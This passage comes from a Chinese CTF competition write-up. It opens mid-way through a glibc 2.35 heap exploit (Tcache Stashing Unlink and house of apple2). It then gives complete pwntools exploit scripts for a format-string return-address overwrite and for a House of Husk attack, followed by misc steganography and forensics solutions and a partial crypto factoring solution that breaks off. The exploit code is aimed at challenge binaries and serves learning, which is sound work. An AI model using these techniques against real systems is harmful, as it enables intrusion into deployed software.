+ 我们接下来要做的是首先恢复unsorted bin chunk的size，然后是想办法进行攻击



**ATTACK**

+ 首先理一下我们攻击的思路，这道题的libc版本是2.35，没有了hook，开了保护也改不了got表。基本上只剩下IO可打，我们现在已经有了libc地址和heap地址，还可以退出程序，可以考虑用house of apple2可用
+ 要打house of apple2，我们有两件事情要做： 
    - 提前在heap上布置好fake IO_FILE
    - 劫持IO_list_all到fake IO_FILE 
        * 一般来说这里的劫持我们都用largebin attack，因为这是高版本中很好利用的一个点。这里我还没探究能否用largebin attack。这里选择了Tcache Stashing Unlink Attack，也就是说将chunk从small bin移动到tcache中，最后打tcache poisoning 
            + 这里需要说下为什么不直接打tcache poisoning。传统的打法为：我们先把0xa0的chunk放 tcache，然后利用0x50的chunk来溢出修改fd，再申请两次将目标位置申请出来。但是从glibc2.31开始就对tcache的counts有检测了：
            + ![[Pasted image 20240426114717.png]] 
                - 在`malloc.c/__libc_malloc`里面
            + 因为我们只释放了一个chunk到tcache，却要申请两个，所以counts会出错
        * 我们在small bin中构造好chunk链，然后将其放到tcache中，最后修改fd来劫持`__IO_list_all`



**extend chunk B放进unsorted bin**

+ 目前我们只能申请到两个地址的chunk，分别是0x50的chunk A和0xa0的chunk B 
    - 因为只能同时拥有一个chunk，只能在这两个chunk来回切换写入（除非把chunk B的size改了，不让他进0xa0大小的tcache中，这样再申请0xa0大小的chunk的时候，就不会申请到他了）
+ 既然是要打Tcache Stashing Unlink Attack，那肯定要small bin chunk，这个chunk从哪来呢。首先small bin的获取方法是从unsorted bin中得到，我们需要满足下面两个条件： 
    - unsorted bin中有small bin大小的chunk，为了后续tcache可控，我们还要使得这个chunk的大小为0xa0
    - 然后是申请一个大于unsorted bin 中small bin chunk的chunk。
+ 条件二好满足，再利用scanf就好，条件一的话，我们是没法绕过tcahce 把chunkB给放到unsorted bin中的，我们的想法是：先把它size改打放到unsorted bin中去，然后再把size改小给放到small bin 中 
    - 这里又有问题，当把chunk B的size改小放到small bin中的时候，我们没办法绕过对unsorted bin的条件检查，可以计算得知我们的修改范围是无法修改chunkB的后面的
+ 这里就要利用unlink来前向合并到chunk A中的fake chunk了。
+ 我们首先在chunk A中伪造fake chunk：



```python
free()
payload=p64(0)*3+p64(0x31)+p64(heap_base+0x12c0)*2+p64(0)*2+p64(0x30)+p64(0xd00)
```



+ 注意要绕过fd和bk的检测，所以fake chunk的fd和bk都指向自己 
    - 然后为了unlink，后面的chunk必须是要进入unsorted bin的大小，所以要修改chunk B的大小，修改的大小是考虑到了fake chunk后面的chunk 的prev_inuse要为1 的，具体来说这个大小刚好包括到我们一开始house of orange产生的chunk X
    - ![[Pasted image 20240426121402.png]]
    - 而这里为了chunk Y不被合并导致错误（原因跟上面一致），就要将Z的prev_inuse置1，怎么置1呢？
    - 答案是在最开始就计算好距离，利用scanf输入对应长度的数据，使得最后一字节的位置刚好为当前Zchunk的SIZE地址，并且我们可以利用3的ASCII为0x33，刚好使得prev_inuse为1，所以要在一开始的时候就调用delete，即`payload=(len-1)*'0'+'3`，其中len就是计算好的偏移量



```python
free3(0xd59)

# house of orange
payload=b'\x00'*0x48 + p64(0xd11)
add(1,payload)
show2(0x1000)
# leak libc
free()


payload=b'a'*0x4f+b'b'
add(1,payload)
show()

p.recvuntil(b'ab')
#0x00007f7f76019ce0-0x7f7f75e00000
libc_base=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-0x219CE0
log.success("libc_base:{}".format(hex(libc_base)))
# recover the unsortedbin's size
free()
payload=b'\x00'*0x48+p64(0xcf1)
add(1,payload)
free()

add(2,'a')
free()

  
add(1,b'a'*0x4f+b'b')
show()

p.recvuntil(b'ab')
heap_base=(u64(p.recv(5).ljust(8,b'\x00'))<<12)-0x1000
log.success("heap_addr:{}".format(hex(heap_base)))
free()

# #0x55dceb2fa2c0-0x55dceb2f9000
# unlink
payload=p64(0)*3+p64(0x31)+p64(heap_base+0x12c0)*2+p64(0)*2+p64(0x30)+p64(0xd00)
add(1,payload)
free()
```



+ 此时的heap结构为： 
    - ![[Pasted image 20240522230059.png]]
    - 可以看到伪造的chunk已经将后面给包住了，接下来就要将其和chunkA中的fake chunk进行unlink合并了



**unlink**



+ 假设我们将要放进small bin 中的chunk为S，那么我们现在首先要在S后面布置好prev_inuse,prevsize



```python
payload=b'\x00'*0x60+p64(0xa0)+p64(0x10)+p64(0)+p64(0x11)
add(2,payload)
```



+ 这里的free顺便就将chunk B首先与fake chunk合并，然后给放到unsorted bin中去了 
    - ![[Pasted image 20240522230418.png]]
+ 然后执行free实现unlink： 
    - ![[Pasted image 20240522230539.png]]
    - 可以看到fake_chunk已经和chunkb合并放入unsorted bin中了，合并后的size是0xd30，并且它的size是我们可以控制的



**获取small bin**

+ 要获取small bin，首先要伪造一个位于unsorted bin中的small bin大小的chunk，我们已经可以控制unsorted bin chunk的size区域，接下来第一步就是要修改它的size，然后把fd和bk构造好 
    - 这里的fd要指向本来的unsorted chunk，bk要指向unsorted bin



```python
add(1,p64(0)*3+p64(0xa1)+p64(heap_base+0x1390)+p64(libc_base+0x219ce0))
```



+ ![[Pasted image 20240522230836.png]]
+ 这样就满足了fd和bk的要求
+ 获取small bin的方式很简单，scanf申请一个超大chunk即可：



```python
show2(0x1000)
```



+ ![[Pasted image 20240522230912.png]]



**伪造small bin链**

+ 既然我们要利用Tcache Stashing Unlink Attack来打，并且现在有了对count的要求，那就不能只有一个small binchunk，至少要有三个： 
    - 一个用来申请出来；另外两个会放进tcache，再修改其中一个的fd，即可实现他cache poisoning



```python
payload=p64(0)*2+p64(0)+p64(0xa1)+p64(heap_base+0X12C0)+p64(heap_base+0x12f0)+p64(0)*3+p64(0xa1)+p64(heap_base+0x12c0)+p64(heap_base+0x1310)+p64(0)+p64(0xa1)+p64(heap_base+0x12f0)+p64(libc_base+0x219D70)
add(1,payload)
free()
```



+ ![[Pasted image 20240522231205.png]]
+ 此时我们就将原来small bin中只有一个chunk伪造成了有三个（**按照BK方向，因为遍历方向就是BK，对FD的检测也不严格，但还是要稍微伪造下**）
+ ![[Pasted image 20240522231250.png]]



**Tcache Stashing Unlink Attack**

+ 此时我们申请一个0x90大小的chunk，就可以实施攻击了，需要注意的是这里会把BK的顺序倒转一下：



```python
add(2, b"aaaa")

free()
```



+ ![[Pasted image 20240522231408.png]]
+ 然后我们就可以通过溢出来tcache poisoning了，不过在这之前我们先回想下我们的目的。我们是要打house of apple2，所以需要在堆上布置好fake IO_FILE，而fake IO FILE的大小至少为0xe0:



```python
system=0x50d60+libc_base
fake_file=flat({
    0x0: b"  sh;",
    0x28: system,
    0xa0: fake_file_addr-0x10,# wide data
    0x88: fake_file_addr+0x100,# 可写，且内存为0即可
    0xD0: fake_file_addr+0x28-0x68,# wide data vtable
    0xD8: libc_base+0x2160C0,# vtable
}, filler=b"\x00")
```



+ 而我们目前不能控制这么长的连续区域，所以还要先用tcache posioning去扩展下堆区域，布置好fake IO_FILE



**house of apple2**

```python

_IO_list_all = libc_base + 0x21a680
system = 0x50d60 + libc_base
 
fake_file = heap_base + 0x2e0
# 见上文House of apple 2中解释

add(1, b"a"*0x10+p64(0) + p64(0x71) + p64((heap_base + 0x2d0 + 0x70)^((heap_base)>>12)))

free()
# 这里是布置House of apple 2
add(2, flat({
    0x0+0x10: b"  sh;",
    0x28+0x10: system,
    0x68: 0x71,
    0x70: _IO_list_all ^((heap_base)>>12),  #tcache poisoning
}, filler=b"\x00"))

free()

add(2, flat({
    0xa0-0x60: fake_file-0x10,
    0xd0-0x60: fake_file+0x28-0x68,
    0xD8-0x60: libc_base + 0x2160C0, # jumptable
}, filler=b"\x00"))

free()

add(2, p64(fake_file))
pause(1)
io.sendline(b"0")
pause(1)
io.sendline(b"cat /flag*")
```



+ 这里写的时候注意两点： 
    - 要修改chunk的size，这样将其delete之后就不会将其重复申请出来
    - 不要把fakefile布置在tcache 的一开始，因为将其删除后会写入fd和key，会覆盖fake file的参数
+ 最终就能getshell了

## 题目：签个到吧
解题步骤

![image-1730940420853](./assets/image-1730940420853.png)



64位，glibc版本为2.31



![image-1730940421389](./assets/image-1730940421389.png)



只有一次机会的非栈上的格式化字符串漏洞

给了栈地址，想到利用格式化字符串修改返回地址为read，然后再次进行格式化字符串的利用，诸葛连弩。

先将给的栈地址接收，并计算返回地址

![image-1730940421836](./assets/image-1730940421836.png)



```python
ru("addr: ")
stack = int(io.recv(12), 16)

p('stack')
```



![image-1730940422311](./assets/image-1730940422311.png)



![image-1730940422868](./assets/image-1730940422868.png)



找到下次我们要返回的地址

接下来就是泄露libc基址以及修改返回地址，需要一次性完成。

![image-1730940423393](./assets/image-1730940423393.png)

![image-1730940424015](./assets/image-1730940424015.png)

```python
read_addr = 0x40133F
ret_addr = stack - 0x28
p('ret_addr')
A = ret_addr & 0xffff
B = read_addr & 0xffff
debug('b *0x401361')
payload = b'%c'*5 + f'%{A-5}c%hn'.encode() #7
payload += b'%c'*9 + b'%p' #leak_libc
payload += f'%{cal(B, A)-23}c%49$hn'.encode()
payload = payload.ljust(0x100, b'\x00')
print(len(payload))
s(payload)
ru('0x')
base = int(io.recv(12), 16) - 0x24083
p('base')
```

这时候程序就会返回到read那里

再然后就是经典的两位两位的构造返回地址到onegadget

**step1：**

```python
# step1
A = (stack + 0x18) & 0xffff
payload = f'%{A}c'.encode() + b'%8$hn'
payload += f'%{cal(B, A)}c'.encode() + b'%49$hn'
payload = payload.ljust(0x100, b'\x00')
s(payload)
A = ogg & 0xffff
payload = f'%{A}c'.encode() + b'%47$hn'
payload += f'%{cal(B, A)}c'.encode() + b'%49$hn'
payload = payload.ljust(0x100, b'\x00')
s(payload)
```

![image-1730940424598](./assets/image-1730940424598.png)

**step2：**

```python
# step2
A = (stack + 0x18 + 0x2) & 0xffff
payload = f'%{A}c'.encode() + b'%8$hn'
payload += f'%{cal(B, A)}c'.encode() + b'%49$hn'
payload = payload.ljust(0x100, b'\x00')
s(payload)
p('ogg')
debug('b *0x401361')
A = (ogg >> 16) & 0xffff
payload = f'%{A}c'.encode() + b'%47$hn'
payload += f'%{cal(B, A)}c'.encode() + b'%49$hn'
payload = payload.ljust(0x100, b'\x00')
s(payload)
```



![image-1730940425286](./assets/image-1730940425286.png)

**step3：**

```python
# step3
A = (stack + 0x18 + 0x4) & 0xffff
payload = f'%{A}c'.encode() + b'%8$hn'
payload += f'%{cal(B, A)}c'.encode() + b'%49$hn'
payload = payload.ljust(0x100, b'\x00')
s(payload)
p('ogg')
debug('b *0x401361')
p('ogg')
A = (ogg >> 32) & 0xffff
payload = f'%{A}c'.encode() + b'%47$hn'
payload += f'%{cal(B, A)}c'.encode() + b'%49$hn'
payload = payload.ljust(0x100, b'\x00')
s(payload)
p('ogg')
```

最后再将printf的返回地址返回到我们的magic地址，主要作用是抬栈，让返回地址最后为one_gadget

```python
# printf_ret --> magic_ret
debug('b *0x401361')
p('ogg')
magic = 0x4013c6
payload = f'%{magic & 0xffff}c'.encode() + b'%49$hn'
payload = payload.ljust(0x100, b'\x00')
s(payload)
```



![image-1730940425853](./assets/image-1730940425853.png)

**exp：**

```python
from pwn import *
from LibcSearcher import *
import ctypes
from struct import pack
import numpy as np
from ctypes import *
from math import log
import warnings
banary = "./pwn"
elf = ELF(banary)
libc = ELF("./libc.so.6")
#libc=ELF("/home/berial/libc/64bit/libc-2.27.so")
#libc=ELF("/home/berial/libc/64bit/libc-2.23.so")
#libc=ELF("/home/berial/libc/32bit/libc-2.27.so")
#libc=ELF("/home/berial/libc/32bit/libc-2.23.so")
#libc=ELF("/home/berial/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so")
#libc=ELF("/home/berial/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
#libc=ELF("/home/berial/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so")
url = '127.0.0.1 8888'
local = 1
if local:
    io = process(banary)
    #io = process(banary, env={LD_LIBRARY:'./libc.so'})
    #io = process(banary,stdin=PTY,raw=False)
else:
    io = remote(*url.replace(':', ' ').split())
warnings.filterwarnings("ignore", category=BytesWarning)
context(log_level = 'debug', os = 'linux', arch = 'amd64')
#context(log_level = 'debug', os = 'linux', arch = 'i386')

def debug(a=''):
    if a != '':
        gdb.attach(io, a)
        pause()
    else:
        gdb.attach(io)
        pause()
def cal(x, y):
    return ((x - y) + 0x10000) % 0x10000
#----------------------------------------------------------------
s = lambda data : io.send(data)
sl = lambda data : io.sendline(data)
sa = lambda text, data : io.sendafter(text, data)
sla = lambda text, data : io.sendlineafter(text, data)
r = lambda : io.recv()
ru = lambda text : io.recvuntil(text)
rl = lambda : io.recvline()
uu32 = lambda : u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
iuu32 = lambda : int(io.recv(10),16)
iuu64 = lambda : int(io.recv(6),16)
uheap = lambda : u64(io.recv(6).ljust(8,b'\x00'))
lg = lambda addr : log.info(addr)
ia = lambda : io.interactive()
lss = lambda s :log.success('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))
p = lambda s: print('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))
#----------------------------------------------------------------
#----------------------------------------------------------------
ru("addr: ")
stack = int(io.recv(12), 16)

read_addr = 0x40133F
ret_addr = stack - 0x28

A = ret_addr & 0xffff
B = read_addr & 0xffff
# debug('b *0x401361')
payload = b'%c'*5 + f'%{A-5}c%hn'.encode() #7
payload += b'%c'*9 + b'%p' #leak_libc
payload += f'%{cal(B, A)-23}c%49$hn'.encode()
payload = payload.ljust(0x100, b'\x00')
print(len(payload))
s(payload)
ru('0x')
base = int(io.recv(12), 16) - 0x24083

gadgets = [0xe3afe, 0xe3b01, 0xe3b04]
ogg = base + gadgets[1]
# stack --> one_gadget

p('base')
p('ret_addr')
p('stack')
# step1
A = (stack + 0x18) & 0xffff
payload = f'%{A}c'.encode() + b'%8$hn'
payload += f'%{cal(B, A)}c'.encode() + b'%49$hn'
payload = payload.ljust(0x100, b'\x00')
s(payload)
p('ogg')
A = ogg & 0xffff
payload = f'%{A}c'.encode() + b'%47$hn'
payload += f'%{cal(B, A)}c'.encode() + b'%49$hn'
payload = payload.ljust(0x100, b'\x00')
s(payload)
p('ogg')
# step2
A = (stack + 0x18 + 0x2) & 0xffff
payload = f'%{A}c'.encode() + b'%8$hn'
payload += f'%{cal(B, A)}c'.encode() + b'%49$hn'
payload = payload.ljust(0x100, b'\x00')
s(payload)
p('ogg')
A = (ogg >> 16) & 0xffff
payload = f'%{A}c'.encode() + b'%47$hn'
payload += f'%{cal(B, A)}c'.encode() + b'%49$hn'
payload = payload.ljust(0x100, b'\x00')
s(payload)
p('ogg')
# step3
A = (stack + 0x18 + 0x4) & 0xffff
payload = f'%{A}c'.encode() + b'%8$hn'
payload += f'%{cal(B, A)}c'.encode() + b'%49$hn'
payload = payload.ljust(0x100, b'\x00')
s(payload)
p('ogg')

p('ogg')
A = (ogg >> 32) & 0xffff
payload = f'%{A}c'.encode() + b'%47$hn'
payload += f'%{cal(B, A)}c'.encode() + b'%49$hn'
payload = payload.ljust(0x100, b'\x00')
s(payload)

# printf_ret --> magic_ret
debug('b *0x401361')
p('ogg')
magic = 0x4013c6
payload = f'%{magic & 0xffff}c'.encode() + b'%49$hn'
payload = payload.ljust(0x100, b'\x00')
s(payload)

ia()
```

## 题目：最喜欢的一集
解题步骤

![image-1730940426416](./assets/image-1730940426416.png)



![image-1730940426889](./assets/image-1730940426889.png)



限制了IO，应该是打不了有关IO的那些house了



![image-1730940427396](./assets/image-1730940427396.png)



add限制了堆块大小



![image-1730940427955](./assets/image-1730940427955.png)



有一次UAF机会，[Berial的House of Husk浅析](http://berial.cn/post/House-of-husk%E6%B5%85%E6%9E%90)

![image-1730940428477](./assets/image-1730940428477.png)



条件都符合，直接就可以打，先泄露libc_base和heapbase

```python
add(0x520)#0
add(0x520)#1
add(0x500)#2
add(0x500)#3

free(0) #UAF
free(2)
show(0)
base = u64(io.recv(8)) - 0x1ecbe0
heapbase = u64(io.recv(8)) - 0xa60
gadgets = [0xe3afe, 0xe3b01, 0xe3b04]
ogg = libcbase + gadgets[0]
printf_function_table = base + 0x1f1318
printf_arginfo_table = base + 0x1ed7b0
```



![image-1730940429015](./assets/image-1730940429015.png)



然后就是House of husk



利用large bin attack将堆地址覆盖到到printf_arginfo_table,并且令printf_function_table不等于0



```python
add(0x500, p64(ogg)*(0x500 // 0x8), 'xx')#2
free(2)
# edit printf_function_table != 0
gift(printf_function_table, 0xff)
payload = p64(base+0x1ed010)*2 + p64(heapbase) + p64(printf_arginfo_table-0x20)
edit(0, 'xx', payload)
add(0x540)#2
```



利用漏洞：

```python
menu(-1)
```

调用printf使其运行one_gadget

**exp：**



```python
from pwn import *
from LibcSearcher import *
import ctypes
from struct import pack
import numpy as np
from ctypes import *
from math import log
import warnings
banary = "./pwn"
elf = ELF(banary)
libc = ELF("./libc.so.6")
#libc=ELF("/home/berial/libc/64bit/libc-2.27.so")
#libc=ELF("/home/berial/libc/64bit/libc-2.23.so")
#libc=ELF("/home/berial/libc/32bit/libc-2.27.so")
#libc=ELF("/home/berial/libc/32bit/libc-2.23.so")
#libc=ELF("/home/berial/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so")
#libc=ELF("/home/berial/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
#libc=ELF("/home/berial/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so")
url = '127.0.0.1 8888'
local = 1
if local:
    io = process(banary)
    #io = process(banary, env={LD_LIBRARY:'./libc.so'})
    #io = process(banary,stdin=PTY,raw=False)
else:
    io = remote(*url.replace(':', ' ').split())
warnings.filterwarnings("ignore", category=BytesWarning)
context(log_level = 'debug', os = 'linux', arch = 'amd64')
#context(log_level = 'debug', os = 'linux', arch = 'i386')

def debug(a=''):
    if a != '':
        gdb.attach(io, a)
        pause()
    else:
        gdb.attach(io)
        pause()
def cal(x, y):
    return ((x - y) + 0x10000) % 0x10000
#----------------------------------------------------------------
s = lambda data : io.send(data)
sl = lambda data : io.sendline(data)
sa = lambda text, data : io.sendafter(text, data)
sla = lambda text, data : io.sendlineafter(text, data)
r = lambda : io.recv()
ru = lambda text : io.recvuntil(text)
rl = lambda : io.recvline()
uu32 = lambda : u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
iuu32 = lambda : int(io.recv(10),16)
iuu64 = lambda : int(io.recv(6),16)
uheap = lambda : u64(io.recv(6).ljust(8,b'\x00'))
lg = lambda addr : log.info(addr)
ia = lambda : io.interactive()
lss = lambda s :log.success('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))
p = lambda s: print('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))
#----------------------------------------------------------------
def menu(idx):
    sla('your choice: ', str(idx))
def add(size, content='\n', name='aaaa'):
    menu(1)
    sla(b'your name: ', name)
    sla(b'the length of your desciption: ', str(size))
    sa(b'the content of your desciption: ', content)
def free(index):
    menu(2)
    sla(b'the index of the people: ', str(index))
def show(index):
    menu(4)
    sla(b'the index of the people: ', str(index))
def edit(index, name, content):
    menu(3)
    sla(b'the index of the people: ', str(index))
    sla(b'the name of the people: ', name)
    sla(b'the content of the desciption: ', content)
def gift(addr, data):
    menu(255)
    sla('Do you like IU?', 'Y')
    sla('Give you a reward!', p64(addr)[:-1])
    sl(p8(data))
#----------------------------------------------------------------
add(0x520)#0
add(0x520)#1
add(0x500)#2
add(0x500)#3

free(0) #UAF
free(2)
show(0)
base = u64(io.recv(8)) - 0x1ecbe0
heapbase = u64(io.recv(8)) - 0xa60
gadgets = [0xe3afe, 0xe3b01, 0xe3b04]
ogg = base + gadgets[0]
printf_function_table = base + 0x1f1318
printf_arginfo_table = base + 0x1ed7b0

add(0x500, p64(ogg)*(0x500 // 0x8), 'xx')#2
free(2)
# edit printf_function_table != 0
gift(printf_function_table, 0xff)
payload = p64(base+0x1ed010)*2 + p64(heapbase) + p64(printf_arginfo_table-0x20)
edit(0, 'xx', payload)
add(0x540)#2
menu(-1)

p('heapbase')
p('base')
# debug()
ia()
```

# MISC
## 题目：Solver的开拓之路
解题步骤



首先解压压缩包获得一个apk，经过安装确实是个正常的星铁安装包，根据题目提示在apk文件中寻找secret，发现一个压缩包



![image-1730940429553](./assets/image-1730940429553.png)



虽然没有得到密码的提示，但压缩包中mp3文件与同目录下的mp3类似，因而我们可以使用明文攻击解密



![image-1730940430150](./assets/image-1730940430150.png)



解密得到txt文件



![image-1730940430742](./assets/image-1730940430742.png)



根据提示zoo，我们可以联想到兽语解密[兽音译者在线编码解码 - 兽音翻译咆哮体加密解密 (iiilab.com)](https://roar.iiilab.com/)，通过替换编码字符得到flag



![image-1730940431340](./assets/image-1730940431340.png)

## 题目：Ez_mc
解题步骤



打开存档发现需要一个下界合金锭才能获取flag,且无法使用指令



![image-1730940431912](./assets/image-1730940431912.png)



我们可以利用NBTExplorer工具修改存档命令权限



![image-1730940432529](./assets/image-1730940432529.png)



利用give命令得到下界合金锭



![image-1730940433081](./assets/image-1730940433081.png)



获得一个假的flag和一个password



![image-1730940433653](./assets/image-1730940433653.png)



通过查看存档文件，发现一个伪装成资源文件的压缩包



![image-1730940434281](./assets/image-1730940434281.png)



在网上搜索.svp文件打开所用的软件



![image-1730940434778](./assets/image-1730940434778.png)



打开文件后在工程末尾发现奇怪密文，我们可以联想到摩斯密码



![image-1730940435470](./assets/image-1730940435470.png)



解密得flag的后半段



![image-1730940436209](./assets/image-1730940436209.png)

## 题目：套娃是你的谎言？
解题步骤



首先解压压缩包，在wireshark中首先追踪udp流，发现是一堆杂乱数据，但在其中存在两段类似密文的字符串



![image-1730940436789](./assets/image-1730940436789.png)



![image-1730940437393](./assets/image-1730940437393.png)



利用cyberchef对其中一段字符进行base45解密（或用其他工具进行一键解密），拿到其中一段key



![image-1730940437944](./assets/image-1730940437944.png)



利用该key对另一段密文进行base64，xor解密得到假的flag



![image-1730940438439](./assets/image-1730940438439.png)



从而我们重新分析题目，该流量包名为“打一个timing！”，因而我们可以联想到从网络上获取时间ntp协议，该协议也可在流量包中发现



![image-1730940438966](./assets/image-1730940438966.png)



通过分析其中信息，却没有什么发现，因而我们进行分析每次获取时间的时间差，发现存在一定规律



通过分析，我们还可以将其值乘10再取整作为ascii值转文字，可得一个pass



```python
time=[8.972008, 20.172647, 20.259451, 29.960382, 30.092938, 41.593605, 41.673149, 53.173706, 53.254845, 59.355902, 59.481600, 71.382342, 71.564876, 81.665601, 81.739929, 92.540906, 92.609521, 102.511004, 102.654159, 113.754793, 113.856658, 124.757317, 124.862347, 134.962710, 135.053263, 146.653963, 146.738695, 157.839347, 157.990778, 168.391236, 168.539019, 178.539767, 178.647972, 188.548326,188.710813, 200.311356, 200.487545, 210.688332, 210.829233]
c=[]
for i in range(0,len(time)-1,2):
	c.append(time[i+1]-time[i])
print(c)
for i in range(0,len(c)):
	c[i]=int(c[i]*10)
	print(chr(c[i]),c[i])
```



![image-1730940439579](./assets/image-1730940439579.png)



然后，利用binwalk分离流量包，可以得到一个压缩包



![image-1730940440069](./assets/image-1730940440069.png)



可尝试打开zip时却提示已损坏，拿刚刚的pass却也无法解压



![image-1730940440568](./assets/image-1730940440568.png)



根据010的头文件提示，怀疑修改了zip的加密方式，应为AES加密



![image-1730940441068](./assets/image-1730940441068.png)



通过修复文件头、文件尾，可解压压缩包



![image-1730940441568](./assets/image-1730940441568.png)



解压压缩包可得在线文档链接，但我们仅能访问工作表1，但我们可以利用excel函数进行远程调用



![image-1730940442174](./assets/image-1730940442174.png)



利用IMPORTRANGE函数调用发现在工作表18，36，47的内容中发现密文



![image-1730940442833](./assets/image-1730940442833.png)



![image-1730940443294](./assets/image-1730940443294.png)



![image-1730940443954](./assets/image-1730940443954.png)



解密得flag



![image-1730940444449](./assets/image-1730940444449.png)

## 题目：谐乐大典
解题步骤



利用音频文件常规隐写并未发现密文，通过文件名字zero可能存在零宽隐写



![image-1730940444991](./assets/image-1730940444991.png)



利用零宽隐写得到密码



![image-1730940445537](./assets/image-1730940445537.png)



利用工具提取音乐封面，利用010查看发现oursecret加密特征



![image-1730940446091](./assets/image-1730940446091.png)



利用pass解密得到另外一张png，在其中发现细小的像素点，我们可以利用ps中的近邻法提取出其中的像素



![image-1730940446701](./assets/image-1730940446701.png)



![image-1730940447638](./assets/image-1730940447638.png)



获得一个酷似二维码的图片，根据图片名字MXCD可搜得Maxicode



![image-1730940448454](./assets/image-1730940448454.png)



利用工具识别可得flag



![image-1730940449155](./assets/image-1730940449155.png)

# CRYPTO
## 题目：Pell
解题步骤

题目给了我们模数N、椭圆曲线点Q和密文C，我们先看加密函数：

```python
def encrypt(M, N, e):
    xm, ym = M
    M = (xm, ym, 0)
    a = (1 - xm**3) * inverse(ym**3, N) % N
    curve = Pell_Curve(int(a), N)
    if curve.is_on_curve(M):
        return curve.mul(M, e)
    return None
```



这里是实现了一个Cubic Pell Curve的加密，这一步的解法后边会提及；但在这之前，我们需分解一下N（为后面的解法做准备）。

**分解N**

通过ECLCG生成了两个质数作为加密系统的私钥

可以发现ECLCG的生成方式为



$ Q_n=Q_0+nP
 $



于是我们可以得到对应的两个素数的形式：



$ p=(Q_0)_x+(n*P)_x
\\q=(Q_0)_x+[(n_1+1)*n*P]_x
 $



且曲线为$ y^2=x^3 $，是一个奇异曲线；因此该曲线的dlp计算，我们可以转化成数域上的简单运算**（以下的加法，均为椭圆曲线上的加法）**



> 根据参数方程，我们可以设$ X_1=(t^2,t^3),X_i=((at)^2,(at)^3) $
>
>  
>
> 那么$ X_{i+1}=X_i+X_1 $
>
>  
>
> 通过一系列运算化简（当然，上面那步也可以直接用sage去算），可以得到
>
>  
>
> $ X_{i+1}=((\frac{a}{a+1}t)^2,(\frac{a}{a+1}t)^3)
 $
>
>  
>
> 利用此关系可以简单证明（证明一个数列$ a_{i+1}=a_i/(a_i+1), a_1=1 $的性质）一下，便可得到下面这个式子
>
>  
>
> $ X_n=(n^{-2}t^2,n^{-3}t^3)
 $
>
>  
>
> 也即
>
>  
>
> $ nX_1=(n^{-2}t^2,n^{-3}t^3)~~~~~~~~~~~~~①
 $
>



对于我们这个随机数发生器，我们构造大量的测试数据可以发现两个质数之间差的n很小，一般不会超过1000；而我们可以由前面的p、q的素数形式知道：$ q=p+(n_1*P)_x $，且点$ Q_0 $已知。（这里为了方便，我们记：参数方程下的$ Q_0=(t^2,~t^3) $）



于是我们可以设$ nP=(x^2,~x^3) $，然后结合ECLCG的加法，我们就可以得到素数p和q的对应方程



（其中，下式中的$ x_1=(1+n_1)^{-1}x $，这个可以根据①式和前面的式子推导而得）：



$ p\equiv[(t^3-x^3)^2(t^2-x^2)^{-2}-x^2-t^2]~mod~N
\\q\equiv[(t^3-x_1^3)^2(t^2-x_1^2)^{-2}-x_1^2-t^2]~mod~N
 $



然后我们再将上式代入n，便能得到一个方程（因为发现太长了，就不列出来了，这里可以参考后面的代码）；然后就会发现：只有一个未知数x，因此我们在爆破$ n_1+1 $的同时解方程，便可分解出p、q



```python
# recover p, q：
import tqdm
import gmpy2
from Crypto.Util.number import *

n = 142509889408494696639682201799643202268988370577642546783876593347546850250051841172274152716714403313311584670791108601588046986700175746446804470329761265314268119548997548026516318449862727871202339967955587242463610862701184493904376304507029176806166448249192854001854607465457042204258734279909961546441004233711967226919624405968584449147177981949821415107225952390645278348482729250785152039807053641247569456385545220501027102363800108028762768824577077321340577271010321469215228402821463907345773901277193445125640936231772522681574300491883451795804527966948605710874090658775247402867915876744113646170885038891240778364069379164812880482584571673151293322613478565661348746336931021896668941228934951050789999827329748371987279847108342825214485163497943
N = 9909641861967580472493256614158113105414778684219844785944662774988084232380069009372420371597872375863508561123648164278317871844235719752735021659264009
Q =  (5725664012637594848838084306454804843458550077896287815106012266176452953193402684379119042639063659980463425502946083139850146060755640351348257807890845,7995259612407104192119579242200802136801092493271952329412936709212369500868134058817979488983954214781719018555338511778896087250394604977285067013758829)

R.<x> = Zmod(N)[]
f1 = x ^ 2 - Q[0]
f2 = x ^ 3 - Q[1]
for i in f1.roots():
    for j in f2.roots():
        if i[0] == j[0]:
            t = i[0]

R.<x> = Zmod(N)[]
for i in tqdm.tqdm(range(1, 1000)):
    xi = x * inverse(i, N)
    pp = ((t ^ 3 - x ^ 3) ^ 2 - (t ^ 2 + x ^ 2) * (t ^ 2 - x ^ 2) ^ 2)^3
    qq = ((t ^ 3 - xi ^ 3) ^ 2 - (t ^ 2 + xi ^ 2) * (t ^ 2 - xi ^ 2) ^ 2)^2
    f = n * (t ^ 2 - x ^ 2) ^ 6 * (t ^ 2 - xi ^ 2) ^ 4 - pp * qq
    roots = f.roots()
    if roots:
        for xx in roots:
            x1 = xx[0]
            if t != x1:
                p1 = (t ^ 3 - x1 ^ 3) ^ 2 * inverse(int(t ^ 2 - x1 ^ 2), N) ^ 2 - t ^ 2 - x1 ^ 2
                if n % int(p1) == 0:
                    p = int(p1)
                    print(p)
                    break
        if n % int(p1) == 0:
            break


        
r = 3
s = 2
q = int(gmpy2.iroot(n//p^3,2)[0])
```

---

**Cubic Pell Curve解密+模下开根**



然后就是需要找一个Cubic Pell Curve解密系统



思路出自这篇paper：https://eprint.iacr.org/2024/385.pdf，以下是思路：



![image-1730940449802](./assets/image-1730940449802.png)



这里就用到了我们刚刚分解出的p和q；简单来说，这个解密就是以下几步：



